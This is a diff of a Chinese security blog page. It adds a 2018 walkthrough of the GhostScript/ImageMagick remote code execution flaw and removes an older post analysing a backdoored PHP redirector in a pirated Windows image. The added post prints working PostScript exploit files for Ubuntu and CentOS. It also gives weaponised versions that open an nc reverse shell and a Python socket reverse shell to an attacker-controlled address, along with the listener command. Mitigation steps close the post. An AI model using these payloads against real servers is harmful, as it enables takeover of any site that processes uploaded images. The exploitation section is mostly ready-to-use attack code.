@@ -258,6 +258,211 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/22/GhostScript命令执行漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/08/22/GhostScript命令执行漏洞/" itemprop="url">
+                  GhostScript命令执行漏洞
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-22T20:33:46+08:00">
+                2018-08-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/08/22/GhostScript命令执行漏洞/" class="leancloud_visitors" data-flag-title="GhostScript命令执行漏洞">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>今天早上 <a href="http://seclists.org/oss-sec/2018/q3/142" target="_blank" rel="noopener">http://seclists.org/oss-sec/2018/q3/142</a> 曝出了这个imageMagick的漏洞，然后下午从朋友那里听说了，这个漏洞影响范围极广，有缩略图功能的各种网站都有机会中招。当时看着大佬们在百度、新浪等各大厂商的src提交漏洞报告薅赏金的时候，自己也想尝试尝试，奈何手边没有电脑，只能等到晚上回来复现。</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/GhostScript_rce/rce01.png?raw=true" alt=""></p>
+<h2 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h2><p>GhostScript插件被许多图片处理库如 ImageMagick、Python PIL 等所使用，默认情况下这些库会根据图片的内容将其分发给不同的处理方法，其中就包括GhostScript。</p>
+<p>而GhostScript的安全沙箱可以通过构造恶意代码绕过，当我们构造恶意代码并重命名成图片的格式，上传至目标服务器时，目标服务器的图像处理模块（为了完成如头像缩略图等功能）就会触发构造的恶意代码，造成远程代码执行。</p>
+<p>也正是因为使用这些图像处理模块的网站十分多，所以漏洞影响范围极大，对于我们学生党来说，是个刷SRC赚点零花钱的好机会。</p>
+<h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><p>作者给出的测试poc有两种，分别针对centos和ubuntu：</p>
+<h3 id="For-Ubuntu"><a href="#For-Ubuntu" class="headerlink" title="For Ubuntu"></a>For Ubuntu</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">save</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span><br><span class="line">restore</span><br><span class="line">mark /OutputFile (%pipe%id) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure>
+<p>将这样一张图片上传后，经过GhostScript就会触发id命令</p>
+<p>我们在本地可以通过imageMagick的图像压缩功能测试一下，首先安装imageMagick<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install imageMagick</span><br></pre></td></tr></table></figure></p>
+<p>然后使用convert命令压缩图片触发命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert shellexe.jpeg whatever.gif</span><br></pre></td></tr></table></figure></p>
+<p>显示如下信息说明测试成功：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uid=1000(taviso) gid=1000(taviso) groups=1000(taviso),10(wheel)</span><br><span class="line">context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/GhostScript_rce/rce02.png?raw=true" alt=""></p>
+<h3 id="For-CentOS"><a href="#For-CentOS" class="headerlink" title="For CentOS"></a>For CentOS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">legal</span><br><span class="line">mark /OutputFile (%pipe%id) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure>
+<p>centos中除了payload不同以外，其他过程都相同，不过安装imageMagicK需要使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install imageMagicK</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>这两种linux系统中都可以验证漏洞存在了，那么我们该如何利用它呢？</p>
+<p>虽然我们每次直接改id再上传使服务器执行命令也可以，但是未免太过麻烦，想要方便的控制肯定是得反弹一个shell，我这里提供两种方法：</p>
+<h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><p>第一种是反弹一个netcat的连接，因为大部分的linux都会自带nc，我们只需要将id命令改成反弹一个nc到我们监听的服务器和端口即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">legal</span><br><span class="line">mark /OutputFile (%pipe%$(nc -e /bin/sh xxx.xxx.xxx.xxx 1234)) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure></p>
+<p>只要将恶意代码中xxx.xxx.xxx.xxx改为自己的ip，将1234改为自己监听的端口就可以使用了。</p>
+<h3 id="python-shell"><a href="#python-shell" class="headerlink" title="python shell"></a>python shell</h3><p>当然也不排除一些服务器没有nc，这种时候就用第二种方法：反弹一个python shell，linux中基本都是装了python的</p>
+<p>python版本的shell编写可以参考我前面的博客 </p>
+<p>我这里也给出一个直接可以利用的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">save</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span><br><span class="line">restore</span><br><span class="line">mark /OutputFile (%pipe%python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.2.100&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure></p>
+<p>上述两种方法都还需要我们在自己远程监听的服务器上打开一个nc的监听：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 2333</span><br></pre></td></tr></table></figure></p>
+<p>然后上传图片，如果攻击成功就可以得到shell：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/GhostScript_rce/rce03.png?raw=true" alt=""></p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/GhostScript_rce/rce04.png?raw=true" alt=""></p>
+<h2 id="0x04-应对"><a href="#0x04-应对" class="headerlink" title="0x04 应对"></a>0x04 应对</h2><p>暂时官方没有补丁，可以参考长亭安全团队给出的临时解决方案：</p>
+<ul>
+<li><p>1.卸载 GhostScript<br>以 Ubuntu 系统为例，执行以下命令以卸载 GhostScript：<br>sudo apt-get remove ghostscript</p>
+</li>
+<li><p>2.修改 ImageMagick 的 policy 文件，默认位置为 /etc/ImageMagick/policy.xml，在 <policymap> 中加入以下 <policy>（即禁用 PS、EPS、PDF、XPS coders）：</policy></policymap></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;policymap&gt;</span><br><span class="line">  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;PS&quot; /&gt;</span><br><span class="line">  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;EPS&quot; /&gt;</span><br><span class="line">  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;PDF&quot; /&gt;</span><br><span class="line">  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;XPS&quot; /&gt;</span><br><span class="line">&lt;/policymap&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>不过很快官方补丁就会给出，那时就可以直接更新imageMagicK</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/07/利用DNS-Tunnel传输数据/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2266,222 +2471,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/11/一次localhost被劫持发现的盗版系统后门/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/07/11/一次localhost被劫持发现的盗版系统后门/" itemprop="url">
-                  一次localhost被劫持发现的盗版系统后门
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-11T21:56:41+08:00">
-                2018-07-11
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/07/11/一次localhost被劫持发现的盗版系统后门/" class="leancloud_visitors" data-flag-title="一次localhost被劫持发现的盗版系统后门">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00 起因"></a>0x00 起因</h2><p>今天准备通过一个win7虚拟机的web服务测试一些东西的时候，打开127.0.0.1忽然发现有点不对劲，网站怎么跳转到一个<a href="http://www.776633.com的域名，然后又跳转到一个114la什么的网址导航了。" target="_blank" rel="noopener">www.776633.com的域名，然后又跳转到一个114la什么的网址导航了。</a></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/localhost_hijack/hijack01.png?raw=true" alt=""></p>
-<p>在新开一个页面重新访问localhost之后发现并不是自己眼花了，瞬间想到一个可能，嘛耶我该不会被劫持了吧。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/localhost_hijack/hijack02.png?raw=true" alt=""></p>
-<p>能造成这个情况的原因有很多，首先从最危险的情况开始排查，在确保了自己的网络环境是安全的，没有dns劫持等问题之后，考虑到这个系统是很久之前为了节约时间，临时在网上找到的别人封装好的盗版系统，难免会有后门，那么问题应该是出在这个win7系统内部了。</p>
-<h2 id="0x01-HOSTS文件劫持"><a href="#0x01-HOSTS文件劫持" class="headerlink" title="0x01 HOSTS文件劫持"></a>0x01 HOSTS文件劫持</h2><p>在这个临时安装好，没有杀毒软件的系统，有后门、恶意软件的概率很高，很多恶意软件通过修改本地hosts文件对一些网址进行劫持，所以打开hosts看看是不是有恶意软件把hosts文件给更改了。</p>
-<h3 id="HOSTS文件"><a href="#HOSTS文件" class="headerlink" title="HOSTS文件"></a>HOSTS文件</h3><p>Hosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。</p>
-<p>如果恶意软件要通过hosts文件来劫持的话，可以通过添加一行类似：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 www.baidu.com</span><br></pre></td></tr></table></figure></p>
-<p>这样访问百度就会解析到本地ip，如果这个文件的ip被改写成攻击者的服务器地址，那么我们访问后面的域名，就会解析到对方的服务器。</p>
-<h3 id="排查问题"><a href="#排查问题" class="headerlink" title="排查问题"></a>排查问题</h3><p>win7系统的hosts文件在C:\Windows\system32\drivers\etc目录下，我们打开hosts文件查看一下有没有被篡改。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/localhost_hijack/hijack03.png?raw=true" alt=""></p>
-<p>但是在打开的这个hosts文件中，并没有看到任何可疑的东西，那么看来不是HOSTS文件篡改造成的问题，我们只能换个思路了。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/localhost_hijack/hijack04.png?raw=true" alt=""></p>
-<h2 id="0x02-恶意进程"><a href="#0x02-恶意进程" class="headerlink" title="0x02 恶意进程"></a>0x02 恶意进程</h2><p>既然不是hosts的问题，那么我访问127.0.0.1会被定向到恶意网站，一定是有恶意进程将本地80口占用，然后进行这一系列操作的，那么就去查看一下哪些进程在占用着本地80端口。</p>
-<p>在命令行中输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr &quot;80&quot;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/localhost_hijack/hijack05.png?raw=true" alt=""></p>
-<p>看到pid为1120的进程占用着80口，那么在任务管理器中找找到底是什么进程。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/localhost_hijack/hijack06.png?raw=true" alt=""></p>
-<p>按pid排序之后发现是httpd.exe进程，这再熟悉不过了，不就是apache服务吗，不过想想自己也没在这个系统里面装过apache服务，猜想应该是这个系统封装的时候那个作者给弄进去的，不管是不是它造成的，先直接右键关掉整个进程树。</p>
-<p>然后重新访问127.0.0.1，发现已经没有问题了，那么就确定是apache的问题。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/localhost_hijack/hijack07.png?raw=true" alt=""></p>
-<p>这个时候肯定要在apache安装目录看一看这小子到底在搞什么鬼，在检查了一会配置文件等问题之后，在C:\Windows\Apache\htdocs这个目录下的index.php发现了问题：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/localhost_hijack/hijack08.png?raw=true" alt=""></p>
-<p>我来解释一下这段php代码：</p>
-<ul>
-<li>首先这个php文件从 <a href="http://host.660055.com/index3.txt" target="_blank" rel="noopener">http://host.660055.com/index3.txt</a> 这个网站读取一份txt文件，将里面的内容作为字符串存在$index中。</li>
-<li>然后以@为分隔符，将$index字符串分割成为数组保存在$arr中。</li>
-<li>然后将角标为零的元素保存为$host,角标为一的元素保存为$index，并且用$index替换index.php文件内容，用$host替换本地HOSTS文件中的内容进行进一步劫持。</li>
-</ul>
-<p>通过这部分内容，对方就可以通过更改网站中txt的内容，对所有拥有这个php文件的计算机的hosts文件进行更改，并且还能继续更新受害者计算机上的这个php文件做其他的事情。</p>
-<p>再看看这个php文件后面的部分</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/localhost_hijack/hijack09.png?raw=true" alt=""></p>
-<p>可以看到，在所有的代码运行过一遍之后，php文件将网址重定向到 <a href="http://www.776633.com。" target="_blank" rel="noopener">www.776633.com。</a></p>
-<p>在通过burpsuite对这个网址进行抓包之后，除了跳转那个114la的网址导航，就只剩几个js页面。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/localhost_hijack/hijack10.png?raw=true" alt=""></p>
-<p>这几个js页面全部访问了一下，大致看了一下代码然后在控制台运行了一遍之后，发现都是把一些数据发到一个站长数据的页面，没有什么安全问题，应该是攻击者统计一些数据用的。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/localhost_hijack/hijack11.png?raw=true" alt=""></p>
-<p>那么看来最后这个跳转的地址也是对方可控的，初步判断是攻击者用来刷刷这个网址导航的流量，顺便能够起到掩人耳目的作用。</p>
-<h2 id="0x03-清除恶意进程"><a href="#0x03-清除恶意进程" class="headerlink" title="0x03 清除恶意进程"></a>0x03 清除恶意进程</h2><p>分析到这里，整个流程就清楚了，我除了把这个php脚本拷贝一份留下学习思路之外，将这个htdocs目录所有东西删除掉就没有问题了，如果不放心，我们可以将apache软件从计算机卸载，然后删掉整个apache目录就行了。</p>
-<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>我们清理了这个后门，仍不能保证这个系统就一定是安全的，很多盗版镜像站下载下来的系统都存在许许多多这样的问题，这种只用一两次就删掉的虚拟机为了方便用一些封装好的系统没有问题，但是如果我们是安装在自己电脑中长期使用的系统，一定要去官方下载正版的镜像。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -2526,7 +2520,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">90</span>
+                <span class="site-state-item-count">91</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2548,7 +2542,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">57</span>
+                <span class="site-state-item-count">58</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -2590,7 +2584,7 @@
         <div class="copyright" >
   
   &copy; 
-  <span itemprop="copyrightYear">2019</span>
+  <span itemprop="copyrightYear">2020</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
